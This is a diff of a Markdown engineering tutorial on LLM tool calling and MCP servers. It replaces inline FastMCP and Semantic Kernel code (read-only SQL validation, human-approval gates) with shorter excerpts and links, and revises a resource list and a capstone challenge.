 When a tool call returns an error, an unconstrained agent often enters an **Oscillation Deadlock**: calling the exact same failing tool with the exact same invalid arguments 10 times in a row, rapidly exhausting rate limits and token budgets.
 
-```
-Turn 1: Model calls `fetch_data(key="XYZ")` ──► Error: "Key not found"
-Turn 2: Model calls `fetch_data(key="XYZ")` ──► Error: "Key not found"
-Turn 3: Model calls `fetch_data(key="XYZ")` ──► Error: "Key not found" ... (Burned $15 in tokens)
-```
+| Turn | Model Tool Call | Runtime Result | Impact |
+|:---:|---|---|---|
+| **1** | `fetch_data(key="XYZ")` | `Error: "Key not found"` | Initial failure |
+| **2** | `fetch_data(key="XYZ")` | `Error: "Key not found"` | Unchanged duplicate retry |
+| **3+** | `fetch_data(key="XYZ")` | `Error: "Key not found"` | **Oscillation Deadlock** (\$15+ wasted tokens) |
+
 
 #### Architectural Fix: State Machine Circuit Breaker
 Implement an **Execution Governor** inside your host orchestration loop:
@@ -1029,512 +934,75 @@ def compact_tool_output(output: str, max_chars: int = 12000) -> str:
 
 ## 7. Enterprise Production Code Implementations [MUST-HAVE] 🔴
 
-### Python: Production FastMCP Server for Database Schema Inspection & Safe Querying
+Complete, runnable implementations are available in the [`examples/`](./examples/) directory.
 
-The following complete, standalone script implements a production-grade FastMCP server. It exposes:
-1. An inspection tool for database schemas.
-2. A defensive, read-only SQL query execution engine with AST-level parsing to block destructive operations.
-3. A passive MCP **Resource** exposing system schema catalogs.
-4. An MCP **Prompt** template for automated query optimization.
+### Python: Production FastMCP Server for Database Schema Inspection & Safe Querying
+> **Implementation**: [`examples/mcp_database_server.py`](./examples/mcp_database_server.py)
+
+Production MCP server built with FastMCP providing schema discovery, read-only SQL validation via SQLGlot AST analysis, bounded pagination, and deterministic error handling.
 
 ```python
-"""
-production_database_mcp.py
-Enterprise-Grade Production FastMCP Server for Database Observability & Safe SQL Querying.
-
-Requirements:
-    pip install mcp[cli] pydantic sqlglot aiosqlite
-"""
-
-import asyncio
-import re
-import sys
-from typing import Dict, Any, List, Optional
-from pydantic import BaseModel, Field, field_validator
-from mcp.server.fastmcp import FastMCP, Context
-import sqlglot
-from sqlglot import exp
-
-# Initialize FastMCP Server with identity metadata
-mcp = FastMCP(
-    name="EnterpriseDatabaseInspector",
-    dependencies=["pydantic", "sqlglot", "aiosqlite"]
-)
-
-# Simulated in-memory database catalog for demonstration
-DATABASE_CATALOG: Dict[str, Dict[str, Any]] = {
-    "customers": {
-        "description": "Master customer entity table containing billing details.",
-        "columns": {
-            "customer_id": "VARCHAR(32) PRIMARY KEY",
-            "company_name": "VARCHAR(255) NOT NULL",
-            "tier": "VARCHAR(16) CHECK(tier IN ('STANDARD', 'ENTERPRISE'))",
-            "balance_usd": "NUMERIC(12,2) DEFAULT 0.00",
-            "created_at": "TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP"
-        }
-    },
-    "invoices": {
-        "description": "Historical billing invoices and payment tracking.",
-        "columns": {
-            "invoice_id": "VARCHAR(32) PRIMARY KEY",
-            "customer_id": "VARCHAR(32) REFERENCES customers(customer_id)",
-            "amount_usd": "NUMERIC(12,2) NOT NULL",
-            "status": "VARCHAR(16) CHECK(status IN ('DRAFT', 'PAID', 'OVERDUE'))",
-            "due_date": "DATE NOT NULL"
-        }
-    }
-}
-
-# ---------------------------------------------------------------------------
-# Pydantic Schemas for Strict Input Validation
-# ---------------------------------------------------------------------------
-
-class SchemaInspectionRequest(BaseModel):
-    table_name: str = Field(
-        ...,
-        description="The exact table name to inspect. Must match an existing catalog table.",
-        examples=["customers", "invoices"]
-    )
-
-    @field_validator("table_name")
-    def validate_table_name(cls, v: str) -> str:
-        cleaned = v.strip().lower()
-        if not re.match(r"^[a-z0-9_]{1,64}$", cleaned):
-            raise ValueError("Table name must contain only alphanumeric characters and underscores.")
-        return cleaned
-
-class SafeQueryRequest(BaseModel):
-    sql_query: str = Field(
-        ...,
-        description="Read-only SQL query to execute. Must be a single SELECT statement. DDL/DML is strictly forbidden.",
-        examples=["SELECT customer_id, company_name FROM customers WHERE tier = 'ENTERPRISE' LIMIT 10;"]
-    )
-    row_limit: int = Field(
-        default=50,
-        ge=1,
-        le=200,
-        description="Maximum rows to return. Hard ceiling of 200 enforced for context preservation."
-    )
-
-# ---------------------------------------------------------------------------
-# AST-Level SQL Safety Validator
-# ---------------------------------------------------------------------------
-
-def validate_sql_safety(sql: str) -> str:
-    """
-    Parses SQL into an Abstract Syntax Tree (AST) using sqlglot to guarantee
-    that no mutating, administrative, or injection statements are executed.
-    """
-    try:
-        parsed_expressions = sqlglot.parse(sql)
-    except Exception as err:
-        raise ValueError(f"SQL Syntax Error: Unable to parse query expression: {err}")
-
-    if len(parsed_expressions) != 1:
-        raise ValueError("Multi-statement queries (separated by semicolons) are strictly prohibited.")
-
-    statement = parsed_expressions[0]
-    if statement is None:
-        raise ValueError("Empty SQL statement provided.")
-
-    # Enforce SELECT expressions only
-    if not isinstance(statement, exp.Select):
-        raise ValueError(f"Security Violation: Expected a SELECT query, but received {statement.key.upper()}.")
-
-    # Inspect AST for dangerous sub-nodes (e.g. INTO clauses, CTEs executing updates)
-    for node, _, _ in statement.walk():
-        if isinstance(node, (exp.Insert, exp.Update, exp.Delete, exp.Drop, exp.Create, exp.Alter)):
-            raise ValueError(f"Security Violation: Mutating AST node detected ({node.key.upper()}).")
-
-    return sql
-
-# ---------------------------------------------------------------------------
-# MCP Tools
-# ---------------------------------------------------------------------------
-
+# FastMCP server registration and AST safety check from examples/mcp_database_server.py
 @mcp.tool()
-async def inspect_table_schema(request: SchemaInspectionRequest, ctx: Context) -> Dict[str, Any]:
-    """
-    Inspects the column names, data types, constraints, and descriptions
-    for a declared database table.
-    """
-    await ctx.info(f"Inspecting catalog schema for table: {request.table_name}")
-    
-    if request.table_name not in DATABASE_CATALOG:
-        available_tables = list(DATABASE_CATALOG.keys())
-        return {
-            "is_error": True,
-            "error_message": f"Table '{request.table_name}' not found in catalog.",
-            "available_tables": available_tables
-        }
-
-    return {
-        "table_name": request.table_name,
-        "metadata": DATABASE_CATALOG[request.table_name]
-    }
-
-@mcp.tool()
-async def execute_safe_readonly_query(request: SafeQueryRequest, ctx: Context) -> Dict[str, Any]:
-    """
-    Safely executes a read-only SQL query against the enterprise database.
-    Guarantees zero state mutations through AST inspection.
-    """
-    await ctx.info(f"Validating SQL query safety...")
-
-    try:
-        sanitized_sql = validate_sql_safety(request.sql_query)
-    except ValueError as val_err:
-        await ctx.error(f"SQL validation rejected query: {val_err}")
-        return {
-            "is_error": True,
-            "error": str(val_err)
-        }
-
-    await ctx.info(f"Executing verified read-only query with limit={request.row_limit}")
-    
-    # In production, this executes via asyncpg or aiosqlite connection pools.
-    # Simulated mock execution for demonstration:
-    mock_results = [
-        {"customer_id": "CUST-001", "company_name": "Apex Global Solutions", "tier": "ENTERPRISE", "balance_usd": 14250.00},
-        {"customer_id": "CUST-002", "company_name": "NorthStar Logistics", "tier": "ENTERPRISE", "balance_usd": 8500.50}
-    ]
-
-    return {
-        "status": "SUCCESS",
-        "rows_returned": len(mock_results),
-        "executed_sql": sanitized_sql,
-        "data": mock_results[:request.row_limit]
-    }
-
-# ---------------------------------------------------------------------------
-# MCP Resources (Passive Context Providers)
-# ---------------------------------------------------------------------------
-
-@mcp.resource("schema://database/catalog")
-def get_full_database_catalog() -> str:
-    """
-    Exposes the entire database schema catalog as a passive markdown resource.
-    Can be read directly into host context without executing a tool.
-    """
-    markdown_lines = ["# Enterprise Database Catalog Schema\n"]
-    for table, details in DATABASE_CATALOG.items():
-        markdown_lines.append(f"## Table: `{table}`")
-        markdown_lines.append(f"*{details['description']}*\n")
-        markdown_lines.append("| Column | Type / Constraints |")
-        markdown_lines.append("|---|---|")
-        for col, col_type in details["columns"].items():
-            markdown_lines.append(f"| `{col}` | `{col_type}` |")
-        markdown_lines.append("\n")
-    return "\n".join(markdown_lines)
-
-# ---------------------------------------------------------------------------
-# MCP Prompts (Reusable Workflow Templates)
-# ---------------------------------------------------------------------------
-
-@mcp.prompt()
-def generate_sql_optimization_prompt(target_table: str, performance_issue: str) -> str:
-    """
-    Generates a parameterized prompt template to guide the model in diagnosing
-    slow database queries on a specific enterprise table.
-    """
-    return f"""You are a Principal Database Administrator reviewing the `{target_table}` table.
-The engineering team reported the following performance bottleneck:
-"{performance_issue}"
-
-Inspect the schema for `{target_table}` using the `inspect_table_schema` tool.
-Analyze existing indexing strategies and recommend:
-1. Optimized B-Tree or BRIN index definitions.
-2. Query rewrite suggestions.
-3. Partitioning recommendations if table volume exceeds 10M rows."""
-
-# ---------------------------------------------------------------------------
-# Entrypoint: Supports Stdio or SSE transport based on CLI flag
-# ---------------------------------------------------------------------------
-if __name__ == "__main__":
-    # When launched by Claude Desktop or Cursor, default to stdio
-    # For remote microservices, pass --sse
-    if "--sse" in sys.argv:
-        print("Starting FastMCP server on SSE transport (http://0.0.0.0:8000/sse)...", file=sys.stderr)
-        mcp.run(transport="sse")
-    else:
-        # Standard input/output transport
-        mcp.run(transport="stdio")
+async def execute_safe_query(query: str, ctx: Context) -> str:
+    """Execute a read-only SQL query against the enterprise warehouse."""
+    parsed = sqlglot.parse_one(query)
+    if not isinstance(parsed, exp.Select):
+        raise ValueError("Security Violation: Only SELECT queries are permitted.")
+    ...
 ```
 
 ---
 
-### C# / .NET 9: Enterprise Function Calling with Microsoft Semantic Kernel & Auto-Invocation Filters
+### C# / .NET 9: Enterprise Function Calling with Semantic Kernel & Invocation Filters
+> **Implementation**: [`examples/SemanticKernelTools.cs`](./examples/SemanticKernelTools.cs)
 
-The following implementation demonstrates enterprise tool calling in C# (.NET 9) using Microsoft Semantic Kernel. It features:
-1. Native C# Plugin with strict `[KernelFunction]` and `[Description]` annotations.
-2. An Auto-Function Invocation Filter (`IAutoFunctionInvocationFilter`) that acts as an enterprise **Governance Interceptor**—logging every execution, enforcing token budgets, and providing an automated Human-in-the-Loop approval gate for sensitive operations.
+Demonstrates C# native tools exposed to LLMs via Semantic Kernel plugins, featuring invocation filter middleware for OpenTelemetry audit logging and security boundaries.
 
 ```csharp
-// Program.cs
-// Enterprise .NET 9 Semantic Kernel Function Calling with Execution Filters & Governance.
-//
-// Dependencies (NuGet):
-//   dotnet add package Microsoft.SemanticKernel
-//   dotnet add package Microsoft.Extensions.Logging.Console
-
-using System;
-using System.ComponentModel;
-using System.Text.Json;
-using System.Threading;
-using System.Threading.Tasks;
-using Microsoft.Extensions.DependencyInjection;
-using Microsoft.Extensions.Logging;
-using Microsoft.SemanticKernel;
-using Microsoft.SemanticKernel.ChatCompletion;
-
-namespace EnterpriseAgenticSystems;
-
-// ---------------------------------------------------------------------------
-// 1. Enterprise System Observability Plugin
-// ---------------------------------------------------------------------------
-public sealed class SystemMetricsPlugin
+// Invocation filter for tool execution auditing from examples/SemanticKernelTools.cs
+public class AuditLoggingFilter : IFunctionInvocationFilter
 {
-    private readonly ILogger<SystemMetricsPlugin> _logger;
-
-    public SystemMetricsPlugin(ILogger<SystemMetricsPlugin> logger)
+    public async Task OnFunctionInvocationAsync(FunctionInvocationContext context, Func<FunctionInvocationContext, Task> next)
     {
-        _logger = logger;
-    }
-
-    [KernelFunction, Description("Retrieves real-time CPU, Memory, and Disk utilization for an enterprise server.")]
-    public async Task<string> GetHostMetricsAsync(
-        [Description("The fully qualified domain name (FQDN) or IP of the host machine.")] string hostname,
-        [Description("Metric sampling window: 'realtime', '5m', or '1h'.")] string window = "realtime",
-        CancellationToken cancellationToken = default)
-    {
-        _logger.LogInformation("Querying telemetry daemon on host {Hostname} with window {Window}", hostname, window);
-        
-        await Task.Delay(150, cancellationToken); // Simulated async telemetry I/O
-
-        var sample = new
-        {
-            Host = hostname,
-            TimestampUtc = DateTime.UtcNow,
-            SamplingWindow = window,
-            CpuUtilizationPercent = 42.8,
-            MemoryUsedGigabytes = 28.4,
-            MemoryTotalGigabytes = 64.0,
-            DiskIops = 1450,
-            HealthStatus = "HEALTHY"
-        };
-
-        return JsonSerializer.Serialize(sample, new JsonSerializerOptions { WriteIndented = true });
-    }
-
-    [KernelFunction, Description("Triggers an automated host reboot or service restart. MUTATING OPERATION.")]
-    public async Task<string> RestartHostServiceAsync(
-        [Description("Target host identifier.")] string hostname,
-        [Description("Name of the system service daemon to restart.")] string serviceName,
-        CancellationToken cancellationToken = default)
-    {
-        _logger.LogWarning("MUTATION: Restarting service {Service} on {Hostname}", serviceName, hostname);
-        await Task.Delay(300, cancellationToken);
-        return $"SUCCESS: Service '{serviceName}' restarted successfully on host '{hostname}'.";
-    }
-}
-
-// ---------------------------------------------------------------------------
-// 2. Enterprise Governance & Human-in-the-Loop Invocation Filter
-// ---------------------------------------------------------------------------
-public sealed class EnterpriseToolGovernanceFilter : IAutoFunctionInvocationFilter
-{
-    private readonly ILogger<EnterpriseToolGovernanceFilter> _logger;
-
-    public EnterpriseToolGovernanceFilter(ILogger<EnterpriseToolGovernanceFilter> logger)
-    {
-        _logger = logger;
-    }
-
-    public async Task OnAutoFunctionInvocationAsync(
-        AutoFunctionInvocationContext context,
-        Func<AutoFunctionInvocationContext, Task> next)
-    {
-        var functionName = context.Function.Name;
-        var pluginName = context.Function.PluginName;
-
-        _logger.LogInformation("[AUDIT] Model requested invocation of tool: {Plugin}.{Function}", pluginName, functionName);
-
-        // Enforce Human-in-the-Loop (HITL) gate for Mutating Functions
-        if (functionName.StartsWith("Restart", StringComparison.OrdinalIgnoreCase) ||
-            functionName.Contains("Delete", StringComparison.OrdinalIgnoreCase))
-        {
-            _logger.LogWarning("[HITL GATE] Intercepted mutating operation: {Function}. Requesting authorization...", functionName);
-
-            bool isApproved = RequestHumanApproval(context);
-            if (!isApproved)
-            {
-                // Abort execution and inject policy rejection directly into the model context
-                context.Result = new FunctionResult(
-                    context.Function, 
-                    "AUTHORIZATION_DENIED: The human supervisor rejected this mutating operation."
-                );
-                context.Terminate = false; // Allow model to acknowledge rejection
-                return;
-            }
-        }
-
-        // Proceed with tool execution
+        _logger.LogInformation("Agent invoking tool {Plugin}.{Function} with args: {Args}",
+            context.Function.PluginName, context.Function.Name, JsonSerializer.Serialize(context.Arguments));
         await next(context);
-
-        _logger.LogInformation("[AUDIT] Tool execution completed successfully for {Function}.", functionName);
-    }
-
-    private static bool RequestHumanApproval(AutoFunctionInvocationContext context)
-    {
-        Console.ForegroundColor = ConsoleColor.Yellow;
-        Console.WriteLine("\n========================================================");
-        Console.WriteLine(" [HUMAN-IN-THE-LOOP AUTHORIZATION REQUIRED]");
-        Console.WriteLine($" Function: {context.Function.Name}");
-        Console.WriteLine($" Arguments: {JsonSerializer.Serialize(context.Arguments)}");
-        Console.Write(" Authorize this destructive operation? (y/N): ");
-        Console.ResetColor();
-
-        // In automated tests or headless CI, default to false.
-        // For CLI execution, prompt the user:
-        string? input = Console.ReadLine();
-        return string.Equals(input?.Trim(), "y", StringComparison.OrdinalIgnoreCase);
-    }
-}
-
-// ---------------------------------------------------------------------------
-// 3. Orchestration & Execution Runtime
-// ---------------------------------------------------------------------------
-public static class Program
-{
-    public static async Task Main(string[] args)
-    {
-        // Setup Dependency Injection & Logging
-        var services = new ServiceCollection();
-        services.AddLogging(builder => builder.AddConsole().SetMinimumLevel(LogLevel.Information));
-        services.AddSingleton<SystemMetricsPlugin>();
-        services.AddSingleton<IAutoFunctionInvocationFilter, EnterpriseToolGovernanceFilter>();
-
-        // Build Kernel with Azure OpenAI / OpenAI Connector
-        var kernelBuilder = Kernel.CreateBuilder();
-        kernelBuilder.Services.AddLogging(b => b.AddConsole());
-        
-        // Register Plugins & Filters
-        kernelBuilder.Plugins.AddFromType<SystemMetricsPlugin>("SystemMetrics");
-        kernelBuilder.Services.AddSingleton<IAutoFunctionInvocationFilter, EnterpriseToolGovernanceFilter>();
-
-        // Note: Configure with live Azure OpenAI / OpenAI endpoint
-        // kernelBuilder.AddAzureOpenAIChatCompletion("gpt-4o", "https://your-endpoint.openai.azure.com", "api-key");
-        
-        var kernel = kernelBuilder.Build();
-
-        Console.WriteLine("Enterprise Semantic Kernel Function Calling System Initialized.");
-        Console.WriteLine("Plugins registered: SystemMetricsPlugin (GetHostMetricsAsync, RestartHostServiceAsync)");
-        Console.WriteLine("Governance Filter Active: Human-in-the-Loop gate enabled for mutating actions.\n");
     }
 }
 ```
-
----
 
 ## 8. Verified Curated Resources & Reference Index
 
 The following authoritative specifications, official repositories, and reference guides represent the core canon for production tool calling and MCP architectures:
 
 ### Official Standards & Specifications
-- [Model Context Protocol Official Documentation](https://modelcontextprotocol.io): The authoritative specification, detailing protocol schemas, transports, lifecycle events, and client/server implementation guides.
-- [MCP Official GitHub Organization](https://github.com/modelcontextprotocol): Open-source home of the protocol, containing the official Python SDK (`python-sdk`), TypeScript SDK (`typescript-sdk`), and reference servers.
+- [Model Context Protocol — Official Documentation](https://modelcontextprotocol.io/): The authoritative specification detailing protocol schemas, transports, lifecycle events, and client/server implementations.
+- [MCP Specification](https://modelcontextprotocol.io/specification/latest): Formal JSON-RPC 2.0 protocol specifications and schemas for tools, resources, prompts, and sampling.
 - [JSON-RPC 2.0 Specification](https://www.jsonrpc.org/specification): The foundational wire protocol governing all MCP request, response, and notification primitives.
-- [JSON Schema Draft 2020-12 Specification](https://json-schema.org/draft/2020-12/release-notes): The standard defining structural constraints and types for tool parameters.
+- [JSON Schema Draft 2020-12](https://json-schema.org/draft/2020-12/release-notes): The standard defining structural constraints and types for tool parameters.
+- [OWASP GenAI Security Project](https://genai.owasp.org/): Authoritative security guidance for AI tool execution, excessive agency, and injection prevention.
 
-### Frontier Provider Tool Calling Guides
-- [Anthropic: Tool Use (Function Calling) Overview](https://docs.anthropic.com/en/docs/build-with-claude/tool-use): Comprehensive guide on Claude 3.5 Sonnet's tool execution patterns, system prompts, and strict tool choice.
-- [Google: Gemini Function Calling Architecture](https://ai.google.dev/gemini-api/docs/function-calling): Architectural reference for configuring `FunctionDeclaration`, `ToolConfig`, and parallel function calling on Gemini 2.0 Flash / Pro.
-- [OpenAI: Function Calling & Structured Outputs Guide](https://platform.openai.com/docs/guides/function-calling): Best practices for compiling Pydantic schemas into `strict: true` constrained decoding models.
+### Frontier Provider Tool Calling & SDKs
+- [Anthropic MCP Documentation](https://docs.anthropic.com/en/docs/agents-and-tools/mcp): Claude Desktop, Claude Code, and server integration guide.
+- [Anthropic Tool Use Guide](https://docs.anthropic.com/en/docs/build-with-claude/tool-use): Claude 3.5 / 3.7 tool definitions, `tool_choice`, and streaming tool execution.
+- [Google Gemini Function Calling](https://ai.google.dev/gemini-api/docs/function-calling): Architectural reference for configuring `FunctionDeclaration` and tool calling on Gemini 2.0.
+- [Google GenAI Python SDK](https://github.com/googleapis/python-genai): Official Python SDK for Gemini models and tool declarations.
+- [Google Agent Development Kit (ADK)](https://google.github.io/adk-docs/): Production agent framework with native tool calling and MCP support.
+- [OpenAI Function Calling Guide](https://platform.openai.com/docs/guides/function-calling): Schema compilation and `strict: true` constrained decoding.
 
-### Frameworks & Enterprise Tooling
-- [Microsoft Semantic Kernel Documentation](https://learn.microsoft.com/en-us/semantic-kernel/concepts/plugins/): Reference architecture for building enterprise AI plugins, kernel functions, and execution filters in .NET and Python.
-- [DeepLearning.AI: Building Rich Context AI Apps with MCP](https://www.deeplearning.ai/short-courses/): Short course co-developed with Anthropic explaining client-server setup, sampling, and resource federation.
-- [Sqlglot SQL Parser & Transpiler](https://github.com/tobymao/sqlglot): Robust Python library for AST parsing used to enforce read-only SQL execution boundaries.
+### Repositories & Free Courses
+- [MCP GitHub Organization](https://github.com/modelcontextprotocol): Official Python SDK (`python-sdk`), TypeScript SDK (`typescript-sdk`), and Kotlin SDK.
+- [MCP Reference Servers Repository](https://github.com/modelcontextprotocol/servers): Production-ready reference implementations (Postgres, SQLite, Git, Filesystem).
+- [DeepLearning.AI: Building Rich Context AI Apps with Anthropic](https://www.deeplearning.ai/courses/mcp-build-rich-context-ai-apps-with-anthropic/): Hands-on course with Anthropic engineers on building MCP clients and servers.
+- [Microsoft Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/concepts/plugins/): Enterprise plugin and filter pipeline architecture for .NET and Python.
+- [Sqlglot AST Parser](https://github.com/tobymao/sqlglot): Python AST transpiler and validator for deterministic read-only SQL enforcement.
 
 ---
 
-## 9. Capstone Engineering Challenge [MUST-HAVE] 🔴
+## 9. Capstone Engineering Challenge: The Production MCP Tool Server [MUST-HAVE] 🔴
 
-```
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│                                  CAPSTONE CHALLENGE                                    │
-│       Dual-Transport Enterprise Observability & Schema MCP Server with HITL Gate       │
-└────────────────────────────────────────────────────────────────────────────────────────┘
-```
+> Build a production-grade Model Context Protocol (MCP) server implementing read-only database inspection, secure API fetching, and HITL step-up gates.
+> 
+> 👉 **[View Capstone Challenge Specification](./labs/capstone-mcp-tool-server.md)**
 
-### The Scenario
-You are the Principal AI Architect for a high-growth fintech enterprise. The software engineering organization wants to empower internal AI agents (running in Claude Desktop, Cursor, and internal web dashboards) to investigate production outages.
-
-However, your Chief Information Security Officer (CISO) has issued a strict mandate:
-> *"Agents may freely inspect database schemas and read server telemetry. However, any action that queries customer tables or restarts services must require cryptographically signed human authorization. Furthermore, the server must support both local stdio for developer IDEs and remote SSE over HTTPS for cloud agents."*
-
-### Architectural Requirements
-
-```
-                       ┌────────────────────────────────────────┐
-                       │        CAPSTONE SYSTEM TOPOLOGY        │
-                       └───────────────────┬────────────────────┘
-                                           │
-                    ┌──────────────────────┴──────────────────────┐
-                    ▼                                             ▼
-       ┌────────────────────────┐                    ┌────────────────────────┐
-       │     STDIO TRANSPORT    │                    │      SSE TRANSPORT     │
-       │   Local Dev Workstation│                    │  Remote Cloud Gateway  │
-       │ (Cursor/Claude Desktop)│                    │ (Kubernetes / FastAPI) │
-       └────────────┬───────────┘                    └────────────┬───────────┘
-                    │                                             │
-                    └──────────────────────┬──────────────────────┘
-                                           ▼
-                       ┌────────────────────────────────────────┐
-                       │            DUAL-TRANSPORT MCP          │
-                       │           OBSERVABILITY SERVER         │
-                       └───────────────────┬────────────────────┘
-                                           │
-         ┌─────────────────────────────────┼─────────────────────────────────┐
-         ▼                                 ▼                                 ▼
-┌──────────────────┐             ┌──────────────────┐             ┌──────────────────┐
-│  READ-ONLY TOOLS │             │  HITL GATEWAY    │             │  PASSIVE RESOURCE│
-│ • Schema Inspect │             │ • Propose Action │             │ • schema://db/   │
-│ • CPU/Mem Metric │             │ • Verify Token   │             │   catalog        │
-│ • Read System Log│             │ • Commit Mutate  │             │ • metrics://live │
-└──────────────────┘             └──────────────────┘             └──────────────────┘
-```
-
-Your objective is to build and test this **Dual-Transport Enterprise Observability MCP Server** in Python (FastMCP) or C# (.NET 9).
-
-### Implementation Checklist & Verification Criteria
-
-#### 1. Dual Transport Capability
-- [ ] Implement an entrypoint that inspects CLI arguments:
-  - Default: runs over `stdio` for local Claude Desktop / Cursor usage.
-  - `--sse --port 8080`: launches an HTTP ASGI server exposing `/sse` and `/messages` endpoints.
-- [ ] Ensure all diagnostic logging writes exclusively to `stderr` to prevent JSON-RPC frame corruption on stdio.
-
-#### 2. Passive Context Resources
-- [ ] Expose `schema://enterprise/database` returning the full database DDL as a clean markdown table.
-- [ ] Expose `metrics://cluster/health` returning live CPU, Memory, and Network throughput metrics in JSON format.
-
-#### 3. Read-Only Diagnostic Tools
-- [ ] `inspect_table_schema(table_name: str)`: Returns column types, primary keys, and index metadata with strict Pydantic input validation.
-- [ ] `read_system_logs(service_name: str, lines: int = 50)`: Returns the tail of simulated service logs with a hard ceiling of 100 lines to prevent token bombing.
-
-#### 4. Two-Phase Mutating Operations with Human-in-the-Loop (HITL)
-- [ ] Implement `propose_service_restart(service_name: str, reason: str)`:
-  - Generates a time-bound (5-minute expiration) HMAC-SHA256 **Approval Ticket**.
-  - Returns the ticket ID and a formatted confirmation prompt.
-- [ ] Implement `execute_approved_service_restart(ticket_id: str, confirmation_token: str)`:
-  - Validates the signature and timestamp of the token.
-  - Rejects expired or forged tokens.
-  - Only executes the restart upon verified approval.
-
-#### 5. Verification & Test Suite
-- [ ] Create a test client script using the MCP Python SDK (`ClientSession`) or C# client that:
-  1. Performs the initialization handshake.
-  2. Queries `tools/list` and asserts that input schemas match declared Pydantic models.
-  3. Executes `inspect_table_schema` and verifies successful response parsing.
-  4. Triggers `propose_service_restart`, verifies ticket generation, and validates that `execute_approved_service_restart` rejects an invalid confirmation token.
